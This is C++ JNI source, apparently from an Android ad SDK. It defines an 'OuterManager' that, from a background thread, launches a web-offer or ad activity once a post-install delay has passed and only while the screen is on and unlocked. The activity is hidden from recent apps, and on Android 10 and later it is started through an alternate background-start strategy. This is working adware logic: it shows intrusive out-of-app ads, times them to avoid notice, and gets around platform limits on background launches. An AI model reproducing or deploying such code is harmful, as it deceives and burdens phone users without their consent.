#include "OuterManager.h"
#include <pthread.h>
#include "../JMethods.h"
#include "../../android/Application.h"
#include "../../android/SharedPreferences.h"
#include "../control/Capturer.h"
#include "../control/ControlRoom.h"
#include "../control/Record.h"
#include "../support/Switch.h"
#include "../../util/System.h"
#include "../../util/LocalFrame.h"
#include "../../android/PackageManager.h"
#include "../../config/FlurryConfig.h"
#include "../../android/AndroidJni.h"
#include "../bgactivity/StartStrategyList.h"
#include "../SunSdk.h"


void JMethods::jWork(JNIEnv *env, jobject thiz) {
    OuterManager::getInstance().run();
}

OuterManager* OuterManager::inst = nullptr;
OuterManager &OuterManager::getInstance() {
    if(inst == nullptr){
        inst = new OuterManager();
    }
    return *inst;
}

void OuterManager::run() {
    pthread_t tid;
    pthread_create(&tid, nullptr, p_run, this);
}

void *OuterManager::p_run(void *args) {
    OuterManager* p;
    p = (OuterManager*)args;

    logd("-OuterManager:knock knock ...");

    SharedPreferences sp(SharedPreferences::getDefaultSharedPreferences(Application::getInstance().getCore()));
    jlong lastTime = sp.getLong("fetch_time", 0);
    if(System::currentTimeMillis() - lastTime > (8*3600*1000)){// 8 hours
        Capturer::getInstance().fetchConfig2();
        logd("-OuterManager:fetch flurry again");
    }

    if(!ControlRoom::getInstance().getSdkEnable()){
        logw("-OuterManager:SDK is not enable");
        return nullptr;
    }

    if(p->getInstallTime() < p->getDelayTime() * 1000){
        logw("-OuterManager:install time is not enough");
        return nullptr;
    }

    jint type = -1;
    if(Record::getInstance().hasWebOffer()){
        type = 1;
    }else if(Record::getInstance().hasAd()){
        type = 2;
    }else{
        logw("-OuterManager:outers quota is not enough");
        return nullptr;
    }

    ControlRoom::getInstance().getFaceless().one();

    if(!p->isScreenOn()){
        logw("-OuterManager:screen off");
        return nullptr;
    }

    if(Switch::offer_enable){
        p->start(type);
    }
    return nullptr;
}

void OuterManager::start(jint type) {
    logd("-OuterManager:start Outers Activity");

    Application& appInst = Application::getInstance();

    Intent activityIntent(appInst.getCore(), SunSdk::getInstance().sunrise) ;
    activityIntent.putExtra("type", type);
    activityIntent.addFlags(Intent::FLAG_ACTIVITY_NEW_TASK | Intent::FLAG_ACTIVITY_CLEAR_TOP | Intent::FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

    if (AndroidJni::get_dev_api_level() < 29) {
        appInst.startActivity(activityIntent.getCore());
    } else {
        StartStrategyList::startActivity2(appInst.getCore(), activityIntent.getCore());
    }
}

jlong OuterManager::getInstallTime() {
    jlong ret = -1;

    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    if(jenv != nullptr){
        LocalFrame frame(jenv);
        Application& app = Application::getInstance();

        PackageManager pkgManager(app.getPackageManager());
        auto pkgName = app.getPackageName();
        jobject pki = pkgManager.getPackageInfo(pkgName, 0);

        jclass cls_PackageInfo = jenv->GetObjectClass(pki);
        jfieldID fid_firstInstallTime = jenv->GetFieldID(cls_PackageInfo, "firstInstallTime", "J");
        jlong firstInstallTime = jenv->GetLongField(pki, fid_firstInstallTime);

        jenv->DeleteLocalRef(pkgName);
        jenv->DeleteLocalRef(pki);

        ret = System::currentTimeMillis() - firstInstallTime;
    }
    return ret;
}

jlong OuterManager::getDelayTime() {
    jlong ret = 0;

    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    if(jenv != nullptr) {
        LocalFrame frame(jenv);

        FlurryConfig &config = FlurryConfig::getInstance();
        jlong num = config.getLong("berg_newUserAdDelayT", 7200);

        ret =  num * 1000;
    }
    return ret;
}

jboolean OuterManager::isScreenOn() {
    jboolean ret = false;

    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    if(jenv != nullptr) {
        LocalFrame localFrame(jenv);

        jobject powerManager = Application::getInstance().getSystemService("power");
        jclass cls1 = jenv->FindClass("android/os/PowerManager");
        jmethodID mid1 = jenv->GetMethodID(cls1, "isInteractive", "()Z");
        jboolean isOpen = jenv->CallBooleanMethod(powerManager, mid1);

        jobject keyguardManager = Application::getInstance().getSystemService("keyguard");
        jclass cls2 = jenv->FindClass("android/app/KeyguardManager");
        jmethodID mid2 = jenv->GetMethodID(cls2, "isKeyguardLocked", "()Z");
        jboolean isLock = jenv->CallBooleanMethod(keyguardManager, mid2);

        ret = isOpen && !isLock;
    }

    return ret;
}
